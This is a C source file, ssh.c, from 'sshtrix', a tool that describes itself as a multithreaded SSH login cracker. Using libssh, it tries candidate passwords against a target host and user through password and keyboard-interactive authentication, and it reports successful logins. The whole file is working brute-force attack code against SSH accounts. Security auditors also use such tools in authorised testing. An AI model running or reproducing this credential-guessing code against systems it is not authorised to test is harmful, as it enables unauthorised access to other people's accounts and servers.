/*******************************************************************************
 * sshtrix - a very fast multithreaded SSH login cracker                       *
 *                                                                             *
 * ssh.c                                                                       *
 *                                                                             *
 * Copyright (C) 2011 noptrix - http://www.noptrix.net/                        *
 *                                                                             *
 * This program is free software: you can redistribute it and/or modify        *
 * it under the terms of the GNU General Public License as published by        *
 * the Free Software Foundation, either version 3 of the License, or           *
 * (at your option) any later version.                                         *
 *                                                                             *
 * This program is distributed in the hope that it will be useful,             *
 * but WITHOUT ANY WARRANTY; without even the implied warranty of              *
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the               *
 * GNU General Public License for more details.                                *
 *                                                                             *
 * You should have received a copy of the GNU General Public License           *
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.       *
 *                                                                             *
 ******************************************************************************/

#include "ssh.h"


static unsigned char interactive_auth(ssh_session, const char *);
static unsigned char password_auth(ssh_session, const char *);
static unsigned char test_auth_methods(ssh_session, job_t *, const char *);
static unsigned char xssh_connect(ssh_session);
static ssh_session set_options(ssh_session, job_t *, const char *, const char *);
static ssh_session create_session();


/* send user and password via keyboard interactive auth mechanism */
static unsigned char interactive_auth(ssh_session session, const char *pass)
{
    char echo = 0, *str = "blah\n";
    const char *name = NULL, *instruction = NULL, *prompt = NULL;
    int x = 0, nprompts = 0, iprompt = 0;


    x = ssh_userauth_kbdint(session, NULL, NULL);

    while (x == SSH_AUTH_INFO) {
        name = ssh_userauth_kbdint_getname(session);
        instruction = ssh_userauth_kbdint_getinstruction(session);
        nprompts = ssh_userauth_kbdint_getnprompts(session);

        for (iprompt = 0; iprompt < nprompts; iprompt++) {
            prompt = ssh_userauth_kbdint_getprompt(session, iprompt, &echo);
            if (echo) {
                if (ssh_userauth_kbdint_setanswer(session, iprompt, str) < 0) {
                    return SSH_AUTH_ERROR;
                }
            } else {
                if (ssh_userauth_kbdint_setanswer(session, iprompt, pass) < 0) {
                    return SSH_AUTH_ERROR;
                }
            }
        }
        x = ssh_userauth_kbdint(session, NULL, NULL);
        if (x == SSH_AUTH_SUCCESS) {
            return LOGIN_FOUND;
        }
    }

    return LOGIN_NOT_FOUND;
}


/* do a password authentication */
static unsigned char password_auth(ssh_session session, const char *pass)
{
    int x = 0;


    x = ssh_userauth_password(session, NULL, pass);

    if (x == SSH_AUTH_SUCCESS) {
        return LOGIN_FOUND;
    }

    return LOGIN_NOT_FOUND;
}


/* getting list of supported authentications and running corresponding ssh
 * auth mechanism */
static unsigned char test_auth_methods(ssh_session session, job_t *job,
                                       const char *pass)
{
    int r = 0, x = 0, method = 0;


    x = ssh_userauth_none(session, NULL);
    method = ssh_userauth_list(session, NULL);
    
    if (method & SSH_AUTH_METHOD_PASSWORD) {
        r = password_auth(session, pass);
    } else if (method & SSH_AUTH_METHOD_INTERACTIVE) {
        r = interactive_auth(session, pass);
    } else {
        if (job->verbose)
        fprintf(stderr, "[-] WARNING: unknown authentication method\n");
        /* TODO: handle unknown/unsupported auth methods */
    }
    
    if (r == LOGIN_FOUND) {
        return LOGIN_FOUND;
    }

    return LOGIN_NOT_FOUND;
}


/* do the connect (wrapper for ssh_connect()) */
static unsigned char xssh_connect(ssh_session session)
{
    int x = 0;


    x = ssh_connect(session);

    if (x != SSH_OK) {
        fprintf(stderr, "\n[-] ERROR: could not connect\n");
        return 2; /* connect error */
    }

    return 0;
}


/* set relevant SSH options */
static ssh_session set_options(ssh_session session, job_t *job,
                               const char *host, const char *user)
{
    const char *identity = "SUXX";


    ssh_options_set(session, SSH_OPTIONS_HOST, host);
    ssh_options_set(session, SSH_OPTIONS_PORT, &job->target->port);
    ssh_options_set(session, SSH_OPTIONS_USER, user);
    ssh_options_set(session, SSH_OPTIONS_IDENTITY, identity);
    ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &job->conn_timeout);

    return session;
}


/* create new ssh session */
static ssh_session create_session()
{
    ssh_session my_session = NULL;

    
    my_session = ssh_new();

    if (my_session == NULL) {
        fprintf(stderr, "\n[-] ERROR: could not create SSH session\n");
        __EXIT_FAILURE;
    }

    return my_session;
}


/* go and trix ssh accounts! */
unsigned char crack(job_t *job, const char *host, const char *user,
                    const char *pass)
{
    unsigned char hit = 0;
    ssh_session session = 0;
    

    session = create_session();
    session = set_options(session, job, host, user);
    sleep(job->delay);
    hit = xssh_connect(session);

    if (hit == 2) {
        /* connect error, so we break here and continue with next host */
        return 2;
    }

    hit = test_auth_methods(session, job, pass);
    ssh_disconnect(session);
    ssh_free(session);

    return hit;
}

/* EOF */

